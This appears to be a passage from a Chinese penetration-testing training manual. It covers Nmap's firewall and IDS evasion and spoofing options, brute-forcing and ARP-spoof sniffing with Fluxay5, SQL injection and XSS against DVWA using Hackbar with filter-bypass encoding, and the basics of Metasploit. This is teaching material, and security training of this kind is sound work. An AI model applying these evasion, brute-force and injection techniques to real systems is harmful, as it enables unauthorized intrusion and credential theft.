+虽然-T0和-T1选项可能有助于避免IDS告警，但在进行上千个主机或端口扫描时，会显著增加时间。对于这种长时间的扫描，宁可设定确切的时间值，而不要去依赖封装的-T0和-T1选项。
+T0选项的主要影响是对于连续扫描，在一个时间只能扫描一个端口，每个探测报文的发送间隔为5分钟。T1和T2选项比较类似， 探测报文间隔分别为15秒和0.4秒。T3是Nmap的默认选项，包含了并行扫描。 T4选项与 --max-rtt-timeout 1250 --initial-rtt-timeout 500 等价，最大TCP扫描延迟为10ms。T5等价于 --max-rtt-timeout 300 --min-rtt-timeout 50 --initial-rtt-timeout 250 --host-timeout 900000，最大TCP扫描延迟为5ms。
+ 
+3．防火墙/IDS躲避和哄骗
+Nmap不提供检测和破坏防火墙及IDS系统的方法 (或Nmap选项)，它使用的是技术和经验，下面描述了相关的选项和完成的工作。
+1）报文分段及使用指定的MTU
+-f选项要求扫描时(包挺ping扫描)使用小的IP包分段。其思路是将TCP头分段在几个包中，使得包过滤器、IDS以及其它工具的检测更加困难。必须小心使用这个选项，有些系统在处理这些小包时存在问题，例如旧的网络嗅探器Sniffit在接收到第一个分段时会立刻出现分段错误。该选项使用一次，Nmap在IP 头后将包分成8个字节或更小。因此，一个20字节的TCP头会被分成3个包，其中2个包分别有TCP头的8个字节，另1个包有TCP头的剩下4个字节。当然，每个包都有一个IP头。再次使用-f可使用16字节的分段(减少分段数量)。使用--mtu选项可以自定义偏移的大小，使用时不需要-f，偏移量必须是8的倍数。包过滤器和防火墙对所有的IP分段排队，如Linux核心中的CONFIG-IP-ALWAYS-DEFRAG配置项，分段包不会直接使用。一些网络无法 承受这样所带来的性能冲击，会将这个配置禁止。其它禁止的原因有分段 包会通过不同的路由进入网络。一些源系统在内核中对发送的报文进行 分段，使用iptables连接跟踪模块的Linux就是一个例子。当使用类似Ethereal的嗅探器时，扫描必须保证发送的报文要分段。如果主机操作系统会产生问题，尝试使用--send-eth选项以避开IP层而直接 发送原始的以太网帧。
+2） 使用诱饵隐蔽扫描
+-D <decoy1 [，decoy2][，ME]，...> 
+为使诱饵扫描起作用，需要使远程主机认为是诱饵在扫描目标网络。IDS可能会报个某个IP的5-10个端口扫描，但并不知道哪个IP在扫描以及哪些不是诱饵。但这种方式可以通过路由跟踪、响应丢弃以及其它主动机制在解决。这是一种常用的隐藏自身IP地址的有效技术。
+使用逗号分隔每个诱饵主机，也可用自己的真实IP作为诱饵，这时可使用 ME选项说明。如果在第6个位置或 更后的位置使用ME选项，一些常用端口扫描检测器(如Solar Designer's excellent scanlogd)就不会报告这个真实IP。如果不使用ME选项，Nmap将真实IP放在一个随机的位置。
+注意，作为诱饵的主机须在工作状态，否则会导致目标主机的SYN洪水攻击。如果在网络中只有一个主机在工作，那就很容易确定哪个主机在扫描。也可使用IP地址代替主机名(被诱骗的网络就不可能在名字服务器日志中发现)。
+诱饵可用在初始的ping扫描(ICMP、SYN、ACK等)阶段或真正的端口扫描阶段。诱饵也可以用于远程操作系统检测(-O)。在进行版本检测或TCP连接扫描时，诱饵无效。
+使用过多的诱饵没有任何价值，反而导致扫描变慢并且结果不准确。此外，一些ISP会过滤哄骗的报文，但很多对欺骗IP包没有任何限制。
+3） 源地址哄骗
+-S <IP_Address> 
+在某些情况下，Nmap可能无法确定你的源地址(如果这样，Nmap会给出提示)。此时，使用-S选项并说明所需发送包的接口IP地址。
+这个标志的另一个用处是哄骗性的扫描，使得目标认为是另一个地址在进行扫描。可以想象某一个竞争对手在不断扫描某个公司！ -e选项常在这种情况下使用，也可采用-P0选项。
+4） 源端口哄骗
+--source-port <portnumber>; -g <portnumber> 
+仅依赖于源端口号就信任数据流是一种常见的错误配置，这个问题非常好理解。例如一个管理员部署了一个新的防火墙，但招来了很多用户的不满，因为他们的应用停止工作了。可能是由于外部的UDP DNS服务器响应无法进入网络，而导致DNS的崩溃。FTP是另一个常见的例子，在FTP传输时，远程服务器尝试和内部用建立连接以传输数据。
+对这些问题有安全解决方案，通常是应用级代理或协议分析防火墙模块。但也存在一些不安全的方案。注意到DNS响应来自于53端口，FTP连接来自于20端口，很多管理员会掉入一个陷阱，即允许来自于这些端口的数据进入网络。他们认为这些端口里不会有值得注意的攻击和漏洞利用。此外，管理员或许认为这是一个短期的措施，直至他们采取更安全的方案。但他们忽视了安全的 升级。
+不仅仅是工作量过多的网络管理员掉入这种陷阱，很多产品本身也会有这类不安全的隐患，甚至是微软的产品。Windows 2000和Windows XP中包含的IPsec过滤器也包含了一些隐含规则，允许所有来自88端口(Kerberos)的TCP和UDP数据流。另一个常见的例子是Zone Alarm个人防火墙到2.1.25版本仍然允许源端口53(DNS)或 67(DHCP)的UDP包进入。
+Nmap提供了-g和--source-port选项(它们是等价的)，用于利用上述弱点。只需要提供一个端口号，Nmap就可以从这些端口发送数据。为使特定的操作系统正常工作，Nmap必须使用不同的端口号。DNS请求会忽略--source-port选项，这是因为Nmap依靠系统库来处理。大部分TCP扫描，包括SYN扫描，可以完全支持这些选项，UDP扫描同样如此。
+5） 发送报文时附加随机数据
+--data-length <number> 
+正常情况下，Nmap发送最少的报文，只含一个包头。因此TCP包通常是40字节，ICMP ECHO请求只有28字节。这个选项告诉Nmap在发送的报文上附加指定数量的随机字节。操作系统检测(-O)包不受影响，但大部分ping和端口扫描包受影响，这会使处理变慢，但对扫描的影响较小。
+6）对目标主机的顺序随机排列
+--randomize-hosts 
+告诉Nmap在扫描主机前对每个组中的主机随机排列，最多可达 8096个主机。这会使得扫描针对不同的网络监控系统来说变得不是很 明显，特别是配合值较小的时间选项时更有效。如果需要对一个较大 的组进行随机排列，需要增大nmap.h文件中 PING-GROUP-SZ的值，并重新编译。另一种方法是使用列表扫描 (-sL -n -oN <filename>)，产生目标IP的列表，使用Perl脚本进行随机化，然后使用-iL提供给Nmap。
+7）MAC地址哄骗
+--spoof-mac <mac address，prefix，or vendor name> 
+要求Nmap在发送原以太网帧时使用指定的MAC地址，这个选项隐含了 --send-eth选项，以保证Nmap真正发送以太网包。MAC地址有几 种格式。如果简单地使用字符串“0”，Nmap选择一个完全随机的MAC 地址。如果给定的字符品是一个16进制偶数(使用:分隔)，Nmap将使用这个MAC地址。 如果是小于12的16进制数字，Nmap会随机填充剩下的6个字节。如果参数不是0或16进 制字符串，Nmap将通过nmap-mac-prefixes查找 厂商的名称(大小写区分)，如果找到匹配，Nmap将使用厂商的OUI(3字节前缀)，然后随机填充剩余的3个节字。正确的--spoof-mac参数有， Apple， 0，01:02:03:04:05:06，deadbeefcafe，0020F2，和Cisco.
+3.8	流光Fluxay5
+3.8.1	简介
+流光5是一款国产免费、功能强大的渗透测试工具， 不仅具有完善的扫描功能，而且自带了很多猜解器和入侵工具，可以方便的利用扫描到的漏洞进行入侵。 除此之外，流光利用C/S结构设计的扫描思想也能适应众多复杂的应用场合。
+流光5的主要功能包括：
+漏洞扫描：
+POP3、FTP、IMAP、TELNET、MSSQL、MYSQL、WEB、IPC、RPC、DAEMON等。
+暴力破解：
+提供POP3/FTP/IMAP/HTTP/PROXY/MSSQL/SMB/WMI的暴力破解功能。
+网络嗅探：
+利用ARP欺骗，对交换环境下的局域网内主机进行嗅探。和流光的漏洞扫描模块一样，网络嗅探也采用了C/S的结构，可以提供远程网络的嗅探功能。
+渗透工具：
+包括SQLCMD/NTCMD/SRV/TCP Relay等得心应手的辅助渗透工具。
+字典工具：
+可以定制各种各样的字典文件，为暴力破解提供高效可用的字典。
+杂项工具：
+PcAnyWhere密码文件的解码等。
+安装注意事项：
+关闭防火墙：在下载安装Fluxay5时，要先关闭防火墙以免防毒软件将Fluxay5的某些组件当做病毒而拒之门外、甚至删除。
+注册组件：在流光的安装目录下(默认为C:\Program Files\NetXeyes\Fluxay5Beta1\)，有一个目录OCX,在此目录中有一个文件register.bat，这个文件是用于注册组件的，以保证流光中的某些组件功能能够正常使用。执行成功以后，会有如下提示：
+ 
+设置密钥：流光中的漏洞扫描采用了C/S结构，其间通过TCP进行通讯，通讯的数据通过3DES进行加密，所以在使用前需要设置一个密钥。在正常情况下，当第一次使用流光的时候，系统会自动提示输入密钥：
+ 
+安装本地扫描引擎：非必须，除非本地的扫描引擎需要为远程的流光提供扫描服务。安装方法：[Tools]->Fluxay Sensor Tools->Install Fluxay Sensor
+ 
+Host IP： 本地网络适配器的IP地址
+NT Account： 系统用户名，必须属于Administrators
+NT Password：系统用户的密码
+Service Name：安装的服务名称
+Display Name： 服务的说明
+Description：服务的描述
+Control Process：控制服务的进程名
+Sensor Process：引擎的进程名
+Remark：注释
+Console Username： 控制服务的用户名，可以任意指定
+Console Password：控制服务的密码，可以任意指定
+Console Port： 控制服务监听的端口，可以任意指定
+Sensor Port： 扫描引擎监听的端口，可以任意指定
+Disable Service Response for STOP： 服务将不会响应STOP命令，成为系统的关键服务
+Force Overwirte： 如果文件已经存在，强性覆盖。
+安装本地嗅探引擎：如果需要在本地主机进行嗅探（所在的局域网段），必须在本地安装嗅探引擎。安装方法：[Tools]->Remote Sniffer->Install ARP Network Sniffer
+ 
+IP Address：本地的IP地址
+Account：系统的用户名，必须属于Administrators组
+Password：系统的密码
+Listen Port: 嗅探引擎监听的端口
+ANS Passwd: 设定连接嗅探引擎时的密码
+Install Kernel Driver：安装底层嗅探驱动，嗅探底层驱动必须安装且在同一台主机中只用安装一次。如果仅仅为了升级嗅探引擎，底层驱动可以不用安装。
+Install Program Only：安装嗅探引擎，嗅探引擎依赖于底层嗅探驱动。
+扫描引擎的服务名称为NetCore，默认监听的端口为1122。
+
+3.8.2	功能使用
+1．界面说明
+启动流光之后，会出现如下的界面：
+ 
+
+各部份功能
+1: 暴力破解的设置区域，这个区域主要用于设置暴力破解和其他相关的辅助功能。
+2：控制台输出，用于查看当前工作的状态，包括扫描和暴力破解等。
+3：扫描出来的典型漏洞列表，在这个列表中大多数情况都可以直接点击，对漏洞加以进一步的验证。
+4：扫描或者暴力破解成功的用户帐号。
+5：扫描和暴力破解的速度控制（通过设置TCP的超时时间来实现）。
+6：扫描和暴力破解时的状态显示，包括并发的线程数目和扫描速度等。
+7：中止按钮，可以中止暴力破解和扫描（IPC的暴力破解除外）＊。
+8：查找功能,用来查找之前的扫描记录。
+
+2．漏洞扫描
+从菜单[Scan]->Advance Scanning（或者按CTRL+A），就可以出现扫描的设置窗口。
+ 
+
+1）高级扫描设置
+扫描范围(Scan Setup)
+流光的扫描包含很多内容，可以根据不同的需要进行选取。扫描的范围可以指定为一个或多个网段，但是这个范围内所包括的主机数目最多不能超过5000台（大约相当于19个C段）。
+在Scan Item中，可以选择需要扫描的内容，只有需要扫描的内容，才会出现在相应的设置窗口中。
+在Target OS中可以选择相应的操作系统，扫描引擎可以根据对操作系统的判断，只扫描被选择的操作系统主机。在默认情况下对所有的操作系统进行扫描。
+选项说明（选项以选中为例进行说明）
+Get Server Name: 获取主机的名称(Hostname)
+Ping First：在扫描之前，首先PING目标主机，如果能够PING到才扫描。这样做的好处在于可以过滤掉大量不存在的IP地址以节约扫描时间，但是也会因此而漏掉一些不响应PING的主机。
+端口设置(PORTS)
+               
+端口是指TCP端口，不包括UDP端口。
+选项说明（选项以选中为例进行说明）
+Scan Stand Port: 扫描默认的标准端口，大约包含50多个标准服务开放的端口。
+Customize Scan Port：自己定义扫描端口的范围，可以在1-65535间选择。
+扫描引擎对TCP端口扫描时采用标准的TCP-Connect的方式进行扫描，所以并不能判断被防火墙过滤掉的开放的端口。
+POP3扫描设置
+选项说明（选项以选中为例进行说明）
+Get POP3 Banner: 扫描POP3服务的Banner。
+Brute Wick Password：尝试用简单的字典对POP3中的帐号进行暴力破解。
+Brute Wick Password所选择的字典包括用户名字典和密码字典。
+用户名字典：［Setup_Dir］\Brute.ult
+密码字典：[Setup_Dir]\Brute.dic
+＊如果扫描引擎已经通过其他途径获得了用户列表（例如通过Finger），那么用户名字典将会被用户列表代替。
+ 
+FTP扫描设置
+选项说明（选项以选中为例进行说明）
+Get FTP Banner: 扫描FTP服务的Banner。
+Detect Anonymous Login：检测是否能进行匿名登录。
+Brute Wick Password：尝试用简单的字典对FTP中的帐号进行暴力破解。
+
+ 
+SMTP扫描设置
+ 
+选项说明（选项以选中为例进行说明）
+Get SMTP Banner: 扫描SMTP服务的Banner。
+Detect EXPN/VRFY：检测是否使用EXPN和VRFY命令进行用户名验证。
+
+IMAP扫描设置
+ 
+选项说明（选项以选中为例进行说明）
+Get IMAP Banner: 扫描IMAP服务的Banner。
+Try to Brute Wick Password：尝试用简单的字典对IMAP中的帐号进行暴力破解。
+
+Telnet扫描设置
+选项说明（选项以选中为例进行说明）
+Get Telnet Banner: 扫描Telnet服务的Banner。
+SunOS Login Remote Exploit：扫描SunOS /bin/login远程溢出弱点。
+ 
+
+CGI扫描设置
+ 
+
+选项说明（选项以选中为例进行说明）
+Get Web Server Banner: 扫描WEB服务的Banner。
+Automatic Select Rules Via OS：根据WEB服务的版本自动选择CGI的扫描规则，这一选项适用于大多数系统。
+HTTP 200／500 Enable Only：仅仅对于HTTP返回的200／500认为是提交的规则成功。否则除了404（页面没有找到）以外都视为成功。
+
+CGI扫描规则设置
+在选择列表中，可以根据需要选择需要检测的CGI规则，默认情况下所有规则都会被选取。
+ 
+SQL扫描设置
+ 
+　
+选项说明（选项以选中为例进行说明）
+Get SA Password Via IIS: 尝试通过IIS的漏洞获得SA的密码。
+Brute Wick Password：尝试用简单的字典对SQL中的帐号进行暴力破解
+SQL Server 2000 Information Gather：扫描SQL Server 2000暴露的系统信息。
+　
+IPC扫描设置
+ 
+选项说明（选项以选中为例进行说明）
+Establish NULL Session: 尝试和目标主机建立空连接。
+Enumerate Share Resource：枚举共享资源，并尝试是否具有密码保护。
+Enumerate User List：枚举用户列表
+Brute Force if Enumerate Succussifully: 如果获得了用户列表，就尝试暴力破解。
+Brute Force Administrators Group Only：仅仅尝试属于Administrators组的用户
+如果没有获得用户列表，就不会尝试暴力破解。流光5中对IPC的暴力破解采用了SMB的机制，和以前版本的API调用相比较，速度有大幅度提高。
+IIS扫描设置
+ 
+选项说明（选项以选中为例进行说明）
+Unicode Holes: 扫描Unicode编码漏洞
+FrontPage Extension：扫描是否安装了 FrontPage 扩展
+Try to Get SAM：尝试获得SAM(Security Accounts Manager)文件
+Try to Get PCAnywhere Password File: 尝试获得PCAnywhere的密码文件
+
+Finger扫描设置
+ 
+选项说明（选项以选中为例进行说明）
+Finger User: 从给定的用户列表中对用户进行过滤，尝试得到正确的用户名。
+Enemurate User Name：对SunOS和Sco系统尝试获得用户列表
+
+RPC扫描设置
+ 
+
+选项说明（选项以选中为例进行说明）
+Get RPC Program ID: 获得RPC的Program ID
+
+MISC扫描设置
+ 
+选项说明（选项以选中为例进行说明）
+Get Bind Version: 获得BIND的版本号
+Brute MySQL Accounts：尝试获得MySQL的帐号
+Get SSH Version：获得SSH的版本号
+
+Plugin扫描设置
+ 
+　
+默认的插件说明
+FrontPage 2000 Extension Exploit: 检测FrontPage 2000 扩展远程溢出
+IIS 5.0 NULL .Printer Exploit: 检测IIS5.0 NULL.Printer远程溢出
+QPOP Verify User: 检测QPOP验证用户名
+Sun OS FTP CWD Verify Username: 检测SunOS的FTP的CWD命令验证用户名 
+
+扫描选项设置（Option）
+ 
+
+选项说明
+Brute Force User File: 尝试暴力破解的用户名字典，用于除了IPC之外的项目。
+此外，如果扫描引擎通过其他途径获得了用户名（例如通过Finger等），那么也不采用这个用户名字典。
+Brute Force User File: 尝试暴力破解的密码字典
+Save Scan Result As：扫描报告的存放名称和位置，默认情况下文件名以[起始IP]-[结束IP].html为命名规则。
+Scan Threads: 扫描时并发的线程数目 
+Option: 其他选项＊
+
+选择扫描引擎
+流光的扫描引擎可以安装在不同的主机上，当然也可以直接从本地直接启动。在完成了前面的扫描设置点击确定之后，下一步需要做的事情就是决定使用什么地方（主机）的扫描引擎来完成扫描工作。如果没有安装过任何扫描引擎，默认将使用本地的扫描引擎。
+ 
+
+选项说明
+Server：选择扫描引擎
+More：使用扫描引擎管理器＊
+Port：扫描引擎监听的端口，本地的扫描引擎使用端口3595
+Account: 用户名，本地扫描引擎用户名LocalHost
+Password: 密码，本地扫描引擎密码为LocalHost
+Show Detail…: 在线工作方式＊
+Run as Daemon…:后台工作方式＊
+Option: 后台工作方式的选项设置＊ 
+点击［START］即可开始扫描，在控制台输出中可以看到如下的内容：
+ 
+当扫描完成后会得到一个扫描报告，里面会有扫描出来的弱点报告。
+2．暴力破解
+暴力破解的设置基本都是在软件左侧的列表栏完成的。列表栏最顶层分四部分：目标主机和辅助主机（其下包含了若干主机类型）、解码字典和方案（其下包含破解密码的字典或方案）、探测历史记录（其下包含曾经探测过的主机）。暴力破解配置的基本逻辑为：在各种主机类型下面添加主机，在主机下添加暴力破解的用户列表，在解码字典和方案下添加密码字典或方案，之后在功能栏“探测”下选择简单或标准模式进行破解。
+
+ 
+设置主机
+选中需要进行暴力破解的主机类型（POP3、FTP等），点击鼠标右键，从弹出的菜单中选择[Edit]->Add（也可以选中之后，直接按Enter）
+ 
+主机可以加入多个，如果主机存放在一个现成的文件中，可以使用右键菜单中的[Edit]->Add From List，从文件对话框中选择含有主机名称或者IP的列表文件，从中选择主机：
+ 
+
+设置用户
+选中需要加入用户的主机，点击鼠标右键，从弹出的菜单中选择[Edit]->Add（也可以选中主机之后，直接按Enter）
+ 
+这种手工输入的方式适用于明确知道用户名的前提下，例如通过Finger或者其他漏洞已经拿到了用户名。
+在大多数的情况下，并不知道在这个系统中究竟有哪些用户，这时候可以采用插入一个用户列表的方式来猜测（实际上除了破解成功的帐号外，还是不能确定这个系统中究竟有哪些用户）。在渗透测试中，通常采用这样的方法寻找第一个突破点。
+选中需要进行加入用户的主机，点击鼠标右键，从弹出的菜单中选择[Edit]->Add From List。
+ 
+由于文件中用户数目过多，所以没有显示出整个文件中的每一个用户名，如果需要显示，可以双击图中波浪线所示的节点（View All Items），即可展开（如果已经展开，双击的效果相当于收缩）。如下图：
+ 
+设置密码
+选中[Decipher Dictionary or Scheme]，点右键，从右键菜单[Edit]->Add。
+从文件列表对话框中选择字典文件或者方案文件。
+字典文件是包含了很多单词的文本文件，每一个单词占用一行。
+方案文件中并没有包含单词，它包含的是产生字典的规则。
+字典可以同时使用多个。
+ 
+
+开始破解
+选中的需要破解的项目（包括主机、用户、字典等，确保相应的项目前面的方框中打上对勾），没有打上对勾的项目不会被使用。
+
+ 
+简单模式破解：“探测”-“简单模式探测”，简单模式不会使用设置的字典，而是用默认的简单模式字典[Setup_dir]\Single.INI
+标准模式破解：“探测”-“标准模式探测”，在这种模式中，必须设置字典。
+IPC（SMB）的破解
+在通常情况下，IPC只须填入主机名称，用户名可以通过枚举得到。
+枚举用户名
+对IPC主机所在的树型列表中进行操作，可以具体到某一台主机，例如可以分别单独开始或者停止某一台主机的探测或枚举。例如：
+ 
+在上图中，当前选中的只有211.161.36.48,那么从菜单选择的命令只对一台主机有效。
+红色标示：表示正在破解（猜测密码）
+绿色标示：表示正在枚举用户
+黑色标示：没有任何操作正在进行
+如果需要对所有主机（IPC）进行操作，那么就需要选中”IPC $ Server”进行类似的的操作。
+ 
+选项说明（选项以选中为例进行说明）
+Brute User Who Belongs to Administrators: 仅仅破解属于Administrators组的用户。
+Stop Brute If Get Administrator Successfully: 只要成功破解出一个属于Administrators组的用户，就停止对此主机的破解。
+[Yes]：在成功获得了用户列表之后，就自动开始破解。
+[No]: 不自动开始破解
+[Option]: 选项
+如果选择了自动开始破解，即[Yes]按纽，那么流光会自动使用密码字典[Fluxay_Dir]\IPCSingle.INI
+ 
+选项说明（选项以选中为例进行说明）
+Emenurate All Users: 枚举所有用户，否则就最多枚举Limited中指定的用户数
+Add User From File If Emenurate Has Failed: 如果枚举失败，那么从指定的文件中加入用户列表
+在某些系统中，用户数量非常多，如果枚举所有的用户会非常耗时。所以在网络传输质量不是很好的环境中，不建议枚举所有用户。
+IPC破解
+如果通过上面的破解没有成功（或者没有选择自动开始破解），那么可以手动开始对IPC$的破解。
+选中需要探测的主机，从右键菜单中选择[Scan]->All IPC$ Remote Logon。
+ 
+
+选项说明（选项以选中为例进行说明）
+Use Single Burce Mode: 使用简单模式字典进行破解
+File：指定一个字典文件进行破解
+Brute Administrators Only: 仅仅破解属于Administrators组的用户。
+Stop Brute If Get Administrator Successfully: 只要成功破解出一个属于Administrators组的用户，就停止对此主机的破解
+IPC的暴力破解采用了SMB/CIFS的方式，所以破解成功的密码是没有区分大小写的。例如：对于密码Password/password/PASSWORD，破解出来的结果都是password。
+3．网络嗅探
+流光5中的嗅探是基于ARP Spoof的，也就是说可以对大多数交换环境的网络进行嗅探。嗅探也采用了C/S的结构，即使是对本地的局域网进行嗅探也需要先安装本地嗅探引擎
+连接嗅探主机
+从菜单[Tools]->Remote Sniffer->Remote ARP Network Sniffer或者按ALT+S。
+ 
+　
+选项说明（选项以选中为例进行说明）
+IP: 安装嗅探引擎的主机，如果是本机则为127.0.0.1
+Port：嗅探引擎监听的端口，默认为1122
+Passwd: 连接嗅探引擎的密码
+Work Offline: 不连接主机，进入嗅探界面，此项功能主要用于打开历史嗅探记录。
+Connect: 开始连接指定的嗅探主机
+
+设置嗅探参数
+连接到嗅探引擎主机后，进入设置部分。
+ 
+选项说明（选项以选中为例进行说明）
+网卡: 选择需要嗅探的网卡，在某些系统中往往安装了多块网卡，选择不同的网卡，可以对不同的网络区域进行嗅探。
+Start IP：嗅探开始的IP范围
+End IP：嗅探结束的IP范围
+Gateway: 网关地址
+Protocol: 选择嗅探的TCP或者UDP数据包，根据选项的不同，下面出现的协议列表会不同。
+Connect: 开始连接指定的嗅探主机
+Receive if (Not)Contain Keywords：仅仅接收（不）包含指定关键字的数据包
+Buffer：缓冲区长度，当缓冲区满了以后，会自动写入指定的记录文件
+LogFile：记录的嗅探文件，文件名+数字的形式线性增长。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+当选择了网卡以后，Start IP、End IP和Gateway会根据网卡的设置变化，通常情况下Gateway地址不用更改。Start IP和End IP的范围必须在网卡设置的范围内。
+Tips：
+不要指定太大的IP范围，通常情况下宽带接入不要超过64个IP，局域网不要超过255个IP，否则流量太大，在某些情况下会引起安装嗅探引擎主机当机。
+    根据需要选择需要嗅探的协议，只有被选中的协议类型才会被发送回客户界面。考虑这一点的关键和流光和嗅探引擎的连接速度有关。
+    如果指定关键字，则只会收到含有（或者不含有）指定关键字的数据包，这样也可以减少数据传输的流量。每一个关键字用”;”间隔。
+　 遵循以上的规则，可以保证整个嗅探的可靠性和稳定性，请根据实际情况进行设置，嗅探的数据并不是越多越好，而是在于数据的质量。
+设置完成后，按下［OK］，进入嗅探的主界面。
+开始嗅探
+嗅探监控的主界面：
+ 
+按下[Start]，就可以通知嗅探引擎开始工作。
+ 
+区域1：嗅探到的数据包列表。
+区域2：显示选中的数据包。
+区域3：控制台输出，用于查看嗅探引擎的工作情况。
+区域4：嗅探网络的流量统计。
+3.9	Firefox 插件-hackbar
+Firefox在渗透测试中是一件非常强大的利器，以其众多优良的渗透插件支撑了各种渗透技术。其中，hackbar就是一种便于渗透测试人员开展SQL注入、XSS、CSRF、URL编码逃逸等测试工作的必备工具，网上关于hackbar使用的教程很少，所以这里就个人之前使用的情况，结合DVWA来介绍下hackbar在web安全测试中的应用。
+准备工作：安装部署好DVWA并将其Security Level设为low。
+3.9.1	SQL注入
+Hackbar在sql注入方面的功能比较简单，主要作用在于针对不同类型的数据库提供了一些转码工具和自动语句，而关于sql注入最核心的注入点查找和查询语句构造还是需要测试者自己来完成。
+ 
+
+由于本章目的是介绍hackbar使用，所以对DWVA的sql注入点查找和语句构造我们就不做赘述，假设我们已经知道DVWA SQL Injection页面的表单存在漏洞，根据User ID查询的结果值有两列且First name处显示结果为查询结果第一列的值，surname处显示结果为查询结果第二列的值。
+
+       		
+ 
+ 
+
+接着通过load url将查询user id 1的url copy到hackbar中（如下），然后根据上面的分析利用user(),database()，version()三个内置函数构造union select语句来获得连接数据库的账户信息、数据库名称、数据库版本信息，具体步骤为在hackbar url中id=1后添加“’ and 1=2 ”,接着点击SQL-Union Select statement，输入2，选中url中的“1,2”后点击“SQL-Mysql-Basic info cloumn”，然后按图中所示只保留”database(),version() – ”即可，最后点击Execute发起请求，页面就会返回数据库名称和数据库版本信息。
+ 
+
+ 
+
+ 
+
+ 
+ 
+	
+3.9.2	XSS
+在DVWA的XSS（Reflected）页面，输入lcheng，点submit
+ 
+在hackbar中load url：
+ 
+选中url中的lcheng字段，点击“XSS-alert(XSS) statement”，并在前后加上<script>和</script>标签
+ 
+ 
+点击Execute即可提交请求并返回结果：
+ 
+在alert语句中，String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串，这个语句等同于alert(“XSS”)，采用 String.fromCharCode()方法可以提高攻击绕过XSS过滤规则或者WAF保护的可能。
+3.9.3	CSRF
+测试CSRF时主要利用到hackbar的Enable Referer选项，可以自定义http请求中的Referer头字段。
+ 
+ 
+URL Encode
+Hackbar提供了多种加密和编码工具，其中一个作用就是用来测试URL编码逃逸，以ips sig中的一条http特征为例：
+ 
+攻击特征为url中包含/boot.ini字段，比如访问http://10.180.187.10/boot.ini的行为即被认定为攻击，这条特征包含在特征库中所以攻击会被ips模块阻拦。但如果将/boot.ini编码变形，就有可能逃过引擎的扫描了。
+在hackbar的url栏输入http://10.180.187.10/DVWA-1.9/boot.ini，然后选中/boot.ini,点击Encoding-urlencode，url就完成了编码，实际测试过程中，可以根据需要进行多重编码和解码。
+ 
+ 
+
+3.10	Metasploit
+	 Metasploit是近年来最强大、最流行和最有发展前途的开源渗透测试平台软件，自2004年横空出世后即引起了安全社区的高度关注，Metasploit平台提供了一个包含大量通用可靠并且经常更新的渗透攻击代码库，集成了许多组件、接口和功能模块，不仅为渗透测试的初学者提供了一套简单易用、功能强大的软件，也是职业渗透测试工程师的一件神器。Metasploit已经成为安全社区进行软件安全漏洞分析研究与开发的一个通用平台，安全社区中的漏洞利用程序往往以Metasploit模块方式进行发布。
+	概括的讲，Metasploit可以帮助你：
+	发现和攻击缺乏维护、配置错误和未打补丁的系统
+    网络侦查，获取目标系统的情报信息
+    集成自动漏洞发现工具nmap、neXpose、Nessus
+    Meterpreter Shell 目标网络内部跳板攻击
+    编写自己的Meterpreter后渗透攻击模块和脚本
+    ......
+3.10.1	Metasploit相关术语
+在学习使用Metasploit前，有必要了解几个专业术语，大部分术语是在Metasploit框架上下文环境中定义的，但通常含义在整个安全业界都是通用的。
+渗透攻击（Exploit）
+利用特定系统、服务、应用的安全漏洞所做的攻击行为。流行的攻击技术包括缓冲区溢出、web应用程序漏洞攻击（SQL）注入等
+攻击载荷（Payload）
+期望目标系统被渗透攻击后去执行的代码，shellcode是其中一种
+Shellcode
+Shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令，shellcode通常用汇编语言编写，在大多数情况下，目标系统执行了shellcode后才会提供一个命令行shell或者Meterpreter shell，这也是shellcode名称的由来。
+模块（Module）
+Metasploit框架中使用的一段软件代码组件，如渗透攻击模块exploit module、
+辅助模块auxiliary module等，这些模块不断变化发展，是框架的核心
+监听器（Listener）
+Metasploit中用来等待连入网络连接的组件
+Metasploit用户接口
+包括终端、命令行和图形化界面
+Msf终端
+框架中最流行、最灵活、功能最丰富、支持最好的工具之一，能够访问Metasploit框架中几乎每一个选项和配置。
+启动MSF终端： 直接命令行输入msfconsole 即可
+  
+Msf终端的命令集在各个版本中基本稳定，如果想了解某个命令的用法，直接help+命令名就行了，比如msf>help connect就能查看connect命令的帮助文档。
+Msf命令行
+相对于msfconsole对用户更友好的交互方式，msfcli主要考虑脚本处理和其他命令行工具的互操作性，比如，msfcli可以直接从命令行shell执行并允许将其他工具的输出重定向到msfcli或者将msfcli的输出重定向到其他命令行工具，此外它同样也支持启动渗透攻击和辅助模块，这样在你明确知道要使用的渗透攻击模块和所需要的配置参数时使用msfcli效率能提高很多。
+使用msfcli –h能查看基本的帮助文档
+ 
+如果不知道如何输入命令参数时，可以在输入的字符串命令后加上一个字符“O”，就可以看到模块中所提供的配置参数，下图就使用“O”查看了ms08_067_netapi模块的配置参数选项。
+ 
+可以看到这个模块需要3个配置选项：RHOST、RPORT和SMPIPE，之后再加上字符“P”就能检查可用的攻击载荷。
+ 
+在设置完所有必须的配置选项并选择了一个攻击载荷之后，就可以在msfcli命令参数字符串最后加上字符“E”，来运行渗透测试代码，如下：
+ 
+攻击成功，我们拿到了远程windows主机的shell窗口。
+Armitage图形化用户接口
+Metasploit框架中的armitage组件是一个完全交互式的图形化用户接口，具有丰富的功能且免费。
+运行Armitage：直接shell下执行armitage，在启动过程中选择“Start MSF”就可以让armitage连接到Metasploit实例上。
+ 
+Armitage启动后，简单地点击菜单项就可以执行特定的渗透攻击或访问其他Metasploit功能
+ 
+3.10.2	利用Metasploit实施一次渗透攻击
+1．情报搜集
+情报搜集包括被动信息搜集和主动信息搜集。
+被动信息搜集：不接触目标系统的情况下间接挖掘目标信息，可以确定网络边界情况、运维人员、网络中使用操作系统及网站服务器类型，便捷的工具有whois、nslookup、netcraft等
+主动信息搜集：直接与目标系统交互，深入了解确定目标开放的端口和服务，提高渗透成功的机会，常见的工具有nmap端口扫描、Metasploit内置辅助模块等，其中nmap可以作为一个第三方扫描器独立运行，也可以在Metasploit中运行。
+独立运行NMAP：
+nmap -sS -Pn 10.180.187.16
+可以添加-A选项进行深入的服务枚举和旗标获取，获取更多细节
+在MSF console中运行Nmap：可以很方便的将操作记录和结果记录在数据库中，这在大量测试目标的情况下优势很明显。
+首先使用init.d脚本启动postgresql和Metasploit服务：
+ 
+第一次启动metasploit服务时会建表。启动msfconsole用db_status查看数据库连接情况。
+ 
+成功连接到数据库后可以执行db_nmap：
+ 
+db_hosts查看数据库已保存的host信息：
+ 
